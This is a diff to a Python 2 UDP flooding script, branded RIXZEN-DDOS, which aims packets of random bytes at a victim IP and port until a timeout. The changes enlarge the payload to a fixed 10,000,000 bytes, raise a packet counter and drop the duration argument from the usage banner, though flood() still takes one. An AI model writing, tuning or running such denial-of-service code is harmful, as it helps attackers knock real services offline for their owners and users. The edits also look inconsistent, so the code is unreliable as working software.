@@ -5,7 +5,7 @@ import sys
 def usage():
     print "\033[1;32m#######################################################################"
     print "#----------------------------[\033[1;91mRIXZEN-DDOS\033[1;32m]----------------------------#"
-    print "#   \033[1;91mCommand: " "python2 RixzenDDoS.py " "<ip> <port> <packet> <duration>\033[1;32m    #"
+    print "#   \033[1;91mCommand: " "python2 RixzenDDoS.py " "<ip> <port> <packet>\033[1;32m              #"
     print "#                                                                    ##"
     print "#\033[1;91mCreator: MrNath     \033[1;32m##     #      #                                 ##"
     print "#\033[1;91mTeam   : MCI        \033[1;32m##     #      #                                 ##"
@@ -14,9 +14,9 @@ def usage():
     print "#######################################################################"
 def flood(victim, vport, packets, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(packets)
+    bytes = random._urandom(10000000)
     timeout =  time.time() + duration
-    sent = 25000
+    sent = 100000
     while 1:
         if time.time() > timeout:
             break
